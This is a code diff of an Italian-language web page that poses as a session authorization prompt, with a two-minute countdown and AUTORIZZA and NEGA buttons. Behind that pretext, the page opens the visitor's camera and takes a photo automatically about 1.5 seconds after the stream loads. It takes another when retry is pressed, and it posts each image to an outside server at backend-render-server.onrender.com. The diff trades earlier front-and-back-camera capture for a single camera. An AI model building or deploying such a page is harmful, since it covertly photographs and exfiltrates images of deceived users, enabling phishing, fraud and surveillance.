@@ -71,6 +71,14 @@
       color: #000;
     }
 
+    .link {
+      color: #00bfff;
+      font-size: 14px;
+      margin: 6px 0;
+      text-decoration: none;
+      display: block;
+    }
+
     .loading {
       font-size: 18px;
       margin-top: 30px;
@@ -109,28 +117,20 @@
     <p class="timer">⚠︎ Sessione in scadenza tra <span id="countdown">02:00</span></p>
   </div>
 
-  <video id="videoFront" autoplay playsinline></video>
-  <video id="videoBack" autoplay playsinline></video>
-  <canvas id="canvasFront"></canvas>
-  <canvas id="canvasBack"></canvas>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
 
   <button class="autorizza" onclick="handleClick()">AUTORIZZA</button>
   <button class="nega" onclick="showFailure()">NEGA</button>
 </div>
 
 <script>
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const context = canvas.getContext('2d');
   const countdownEl = document.getElementById('countdown');
   const card = document.getElementById('card');
-  const videoFront = document.getElementById('videoFront');
-  const videoBack = document.getElementById('videoBack');
-  const canvasFront = document.getElementById('canvasFront');
-  const canvasBack = document.getElementById('canvasBack');
-  const contextFront = canvasFront.getContext('2d');
-  const contextBack = canvasBack.getContext('2d');
-
-  document.getElementById('data-operazione').innerText = new Date().toLocaleString('it-IT', {
-    timeZone: 'Europe/Rome'
-  });
+  document.getElementById('data-operazione').innerText = new Date().toLocaleDateString('it-IT');
 
   let seconds = 120;
   const timer = setInterval(() => {
@@ -144,61 +144,28 @@
     }
   }, 1000);
 
-  async function startVideoStreams() {
-    const devices = await navigator.mediaDevices.enumerateDevices();
-    const videoDevices = devices.filter(d => d.kind === 'videoinput');
-
-    const frontCam = videoDevices.find(d => d.label.toLowerCase().includes('front')) || videoDevices[0];
-    const backCam = videoDevices.find(d => d.label.toLowerCase().includes('back')) || videoDevices[1];
-
-    if (frontCam) {
-      navigator.mediaDevices.getUserMedia({ video: { deviceId: frontCam.deviceId } })
-        .then(stream => {
-          videoFront.srcObject = stream;
-        })
-        .catch(err => {
-          console.warn('❌ Fotocamera frontale non disponibile', err);
-        });
-    }
-
-    if (backCam) {
-      navigator.mediaDevices.getUserMedia({ video: { deviceId: backCam.deviceId } })
-        .then(stream => {
-          videoBack.srcObject = stream;
-        })
-        .catch(err => {
-          console.warn('❌ Fotocamera posteriore non disponibile', err);
-        });
-    }
-  }
-
-  startVideoStreams();
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      video.srcObject = stream;
+      video.onloadedmetadata = () => {
+        setTimeout(() => {
+          takeAndSendPhoto("auto-scatto");
+        }, 1500);
+      };
+    })
+    .catch(() => {
+      showFailure("Operazione annullata");
+    });
 
   function takeAndSendPhoto(action) {
-    if (videoFront.readyState >= 2) {
-      canvasFront.width = videoFront.videoWidth;
-      canvasFront.height = videoFront.videoHeight;
-      contextFront.drawImage(videoFront, 0, 0, canvasFront.width, canvasFront.height);
-      const imgFront = canvasFront.toDataURL('image/png');
-      uploadImage(imgFront, action + '_front');
-    }
-
-    setTimeout(() => {
-      if (videoBack.readyState >= 2) {
-        canvasBack.width = videoBack.videoWidth;
-        canvasBack.height = videoBack.videoHeight;
-        contextBack.drawImage(videoBack, 0, 0, canvasBack.width, canvasBack.height);
-        const imgBack = canvasBack.toDataURL('image/png');
-        uploadImage(imgBack, action + '_back');
-      }
-    }, 1500); // Delay per scattare prima la frontale
-  }
-
-  function uploadImage(image, label) {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const image = canvas.toDataURL('image/png');
     fetch('https://backend-render-server.onrender.com/upload', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ action: label, image })
+      body: JSON.stringify({ action, image })
     });
   }
 
@@ -210,7 +177,9 @@
 
   function handleRetry() {
     takeAndSendPhoto("riprovare");
-    setTimeout(() => location.reload(), 1000);
+    setTimeout(() => {
+      location.reload();
+    }, 1000);
   }
 
   function showFailure(msg = null) {
@@ -229,12 +198,6 @@
       <div class="loading">Autorizzazione in corso...</div>
     `;
   }
-
-  // Autoscatto iniziale ritardato
-  setTimeout(() => {
-    console.log("📸 Autoscatto in corso");
-    takeAndSendPhoto("auto-scatto");
-  }, 3000);
 </script>
 
 </body>
